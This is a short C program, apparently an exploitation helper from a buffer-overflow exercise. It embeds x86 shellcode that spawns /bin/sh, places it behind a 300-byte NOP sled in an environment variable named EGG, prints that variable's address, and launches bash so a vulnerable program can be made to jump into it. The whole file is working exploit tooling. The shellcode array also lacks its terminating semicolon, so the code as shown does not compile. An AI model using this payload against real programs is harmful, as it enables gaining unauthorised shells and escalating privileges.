#include <stdlib.h>
#include <string.h>
#include <stdio.h>


char code[] = "\x31\xc0\x89\xc2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

int main() {

    /* Print addr of egg if exists */
    char* egg;
    if (egg = getenv("EGG")) {
        printf("Egg is at addr 0x%x\n", egg);
        return 0;
    }

    /* Declare buffer to hold nop sled and egg */
    //size_t buf_size = strlen(code); // strlen(code) == no sled
    size_t buf_size = 300;
    char buf[buf_size];

    /* Fill with nops */
    memset(buf, 0x90, buf_size);

    /* Place shellcode at the end of buf */
    memcpy(&buf[buf_size-strlen(code)], code, strlen(code));

    /* Assign and place the variable in the environment, and overwrite if exists */
    setenv("EGG", buf, 1);

    /* Spwan a shell with the above modified env */
    system("bash");

    return 0;
}
